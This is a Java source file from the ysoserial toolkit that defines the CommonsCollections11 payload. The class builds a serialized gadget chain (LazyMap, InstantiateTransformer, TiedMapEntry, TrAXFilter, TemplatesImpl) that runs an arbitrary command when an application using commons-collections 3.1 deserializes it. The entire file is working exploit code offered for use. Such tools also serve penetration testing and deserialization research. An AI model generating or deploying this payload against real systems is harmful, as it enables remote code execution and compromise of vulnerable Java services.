package ysoserial.payloads;

import clojure.lang.Obj;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.PriorityQueue;

/*
ObjectInputStream.readObject()
    PriorityQueue.readObject()
    	...
    	TransformingComparator.compare()
   			InstantiateTransformer.transform()
    			TrAXFilter.TrAXFilter()
    			....
                	defineClass()
 */
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections11  extends PayloadRunner implements ObjectPayload<Serializable> {
    private Object templates;

    @Override
    public Serializable getObject(String command) throws Exception {
        this.templates = Gadgets.createTemplatesImpl(command);
        return getObject();
    }

    public Serializable getObject(Object templates) throws Exception {
        this.templates = templates;
        return getObject();
    }

    private  Serializable getObject() throws Exception {
        final Map innerMap = new HashMap();

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        final Map lazyMap = LazyMap.decorate(innerMap, instantiateTransformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, TrAXFilter.class);

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections11.class, args);
    }
}
